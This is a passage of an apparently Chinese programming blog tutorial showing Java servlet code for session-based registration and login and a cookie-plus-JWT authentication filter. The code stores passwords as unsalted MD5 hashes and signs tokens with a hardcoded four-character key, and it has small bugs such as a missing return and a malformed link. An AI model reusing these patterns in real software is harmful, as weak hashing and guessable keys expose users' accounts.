md5.update(pass.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            String passHash = Base64.getEncoder().encodeToString(md5.digest());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            PreparedStatement preparedStatement = <span class="keyword">this</span>.conn.prepareStatement(<span class="string">&quot;select * from userInfo where username = ?&quot;</span>);</span><br><span class="line"></span><br><span class="line">            preparedStatement.setString(<span class="number">1</span>,user);</span><br><span class="line"></span><br><span class="line">            ResultSet resultSet = preparedStatement.executeQuery();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(resultSet != <span class="keyword">null</span> &amp;&amp; resultSet.next())&#123;</span><br><span class="line"></span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;用户名已存在！页面将在 3 秒后跳转回注册界面！&quot;</span>);</span><br><span class="line">                resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=register.jsp&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR -&gt;&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            PreparedStatement preparedStatement = <span class="keyword">this</span>.conn.prepareStatement(<span class="string">&quot;insert into userInfo values(?,?)&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            preparedStatement.setString(<span class="number">1</span>,user);</span><br><span class="line">            preparedStatement.setString(<span class="number">2</span>,passHash);</span><br><span class="line"></span><br><span class="line">            preparedStatement.execute();</span><br><span class="line"></span><br><span class="line">            HttpSession session = req.getSession(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            session.setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">            session.setAttribute(<span class="string">&quot;login&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            success = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR -&gt;&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(success)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;注册成功！页面将在 3 秒后跳转至个人主页！&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=home.jsp&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;注册失败！页面将在 3 秒后跳转至注册页面！&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=register.jsp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">logout</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        HttpSession session = req.getSession(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(session.getAttribute(<span class="string">&quot;user&quot;</span>) == <span class="keyword">null</span> || session.getAttribute(<span class="string">&quot;login&quot;</span>) == <span class="keyword">null</span>)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;还未登录！页面将在 3 秒后跳转至登录页面！&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            session.removeAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            session.removeAttribute(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;登出成功！页面将在 3 秒后跳转至登录页面！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=login.jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String action = req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(action != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">switch</span> (action.toLowerCase(Locale.ROOT)) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;login&quot;</span>:</span><br><span class="line">                        login(req, resp);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;register&quot;</span>:</span><br><span class="line">                        register(req, resp);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        resp.getWriter().write(<span class="string">&quot;参数错误&quot;</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;ERROR -&gt; &quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;参数错误&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String action = req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(action != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (action.toLowerCase(Locale.ROOT))&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;logout&quot;</span>:</span><br><span class="line">                    logout(req,resp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;参数错误&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;ERROR -&gt; &quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="测试">- 测试 -</h5>
<p><code>注册用户</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241753623.png" alt="image-20220224175312508"></p>
<p>此时数据库内容👇</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> userInfo;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------+</span></span><br><span class="line"><span class="operator">|</span> cc       <span class="operator">|</span> xMpCOKC5I4INzFCab3WEmw<span class="operator">=</span><span class="operator">=</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p><code>登录用户</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241754442.png" alt="image-20220224175423335"></p>
<p>接着👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241754192.png" alt="image-20220224175449089"></p>
<p><code>个人主页</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241755088.png" alt="image-20220224175500978"></p>
<p><code>登出用户</code> 👇</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241755686.png" alt="image-20220224175510580"></p>
<h4 id="jwt管理实例">- jwt管理实例 -</h4>
<h5 id="要求-2">- 要求 -</h5>
<p>简单地使用 <code>cookie</code> + <code>jwt</code> 依靠过滤器做身份认证。</p>
<h5 id="实现-2">- 实现 -</h5>
<p>生成页面 <code>generate.jsp</code> 👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Generate&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;core&quot;</span> target=<span class="string">&quot;_self&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input hidden=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;generate&quot;</span>/&gt;</span><br><span class="line">    &lt;p&gt; 用户名 &lt;/p&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>/&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;生成&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>信息页面 <code>info.jsp</code> 👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Info&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;用户名: &lt;%=request.getAttribute(<span class="string">&quot;username&quot;</span>)%&gt;&lt;/h3&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;clear.jsp&quot;</span>&gt;清空jwt&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>清除页面 <code>clear.jsp</code> 👇</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Clear&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;core&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;clear&quot;</span> /&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>包装好的 <code>Jwt</code> 类👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> custom;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.timer.Timer;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Jwt</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">private</span> String key = <span class="string">&quot;dqv5&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">private</span> String signer = <span class="string">&quot;morouu&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">private</span> <span class="keyword">long</span> endTime = <span class="number">30</span> * Timer.ONE_MINUTE;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generate</span><span class="params">(Map&lt;String, Object&gt; map, SignatureAlgorithm sign)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> nowTime = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        Date now = <span class="keyword">new</span> Date(nowTime);</span><br><span class="line">        Date end = <span class="keyword">new</span> Date(nowTime + endTime);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .addClaims(map)</span><br><span class="line">                .setId(UUID.randomUUID().toString())</span><br><span class="line">                .setIssuedAt(now)</span><br><span class="line">                .setExpiration(end)</span><br><span class="line">                .setSubject(signer)</span><br><span class="line">                .signWith(sign,key)</span><br><span class="line">                .compact();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Claims <span class="title">parse</span><span class="params">(String token)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.parser()</span><br><span class="line">                .setSigningKey(key)</span><br><span class="line">                .parseClaimsJws(token)</span><br><span class="line">                .getBody();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>处理编码的 <code>filter</code> 👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jwtmanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;textFilter&quot;, value = &#123;&quot;/*&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">textFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>处理认证的 <code>filter</code> 👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jwtmanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;jwtFilter&quot;, value = &#123;&quot;/info.jsp&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jwtFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Cookie[] cookies = ((HttpServletRequest)request).getCookies();</span><br><span class="line">        String user = <span class="string">&quot;身份错误！&quot;</span>;</span><br><span class="line">        Claims claims;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Cookie c : cookies)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c.getName().equals(<span class="string">&quot;Jwt&quot;</span>))&#123;</span><br><span class="line">                claims = custom.Jwt.parse(c.getValue());</span><br><span class="line">                <span class="keyword">if</span>(claims != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    user = (String)claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        request.setAttribute(<span class="string">&quot;username&quot;</span>,user);</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>处理逻辑的 <code>servlet</code> 👇</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jwtmanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.timer.Timer;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;core&quot;, value = &quot;/core&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">coreServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">generate</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String user = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(user == <span class="keyword">null</span>)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;用户名为空！将在 3 秒后返回生成页面！&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=generate.jsp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;username&quot;</span>,user);</span><br><span class="line"></span><br><span class="line">        String jwt = custom.Jwt.generate(map, SignatureAlgorithm.HS256);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">&quot;Jwt&quot;</span>,jwt);</span><br><span class="line">        cookie.setHttpOnly(<span class="keyword">true</span>);</span><br><span class="line">        cookie.setMaxAge((<span class="keyword">int</span>) (Timer.ONE_MINUTE * <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line"></span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;生成Jwt成功！请点击 &quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;&lt;a href=\&quot;info.jsp\&quot;&gt; 这里 &lt;/a&gt;&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot; 查看信息，或点击 &quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;&lt;a href=\&quot;clear.jsp\&quot; 这里 &lt;/a&gt;&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;清除Jwt！&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Cookie[] cookies = req.getCookies();</span><br><span class="line">        <span class="keyword">for</span>(Cookie c : cookies)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c.getName().equals(<span class="string">&quot;Jwt&quot;</span>))&#123;</span><br><span class="line">                c.setMaxAge(<span class="number">0</span>);</span><br><span class="line">                resp.addCookie(c);</span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;清除Jwt成功！将在 3 秒后返回生成页面！&quot;</span>);</span><br><span class="line">                resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=generate.jsp&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;未找到Jwt内容！将在 3 秒后返回生成页面！&quot;</span>);</span><br><span class="line">        resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=generate.jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String action = req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(action != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;generate&quot;</span>.equals(action.toLowerCase(Locale.ROOT))) &#123;</span><br><span class="line">                generate(req, resp);</span><br><span class="line">                success = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        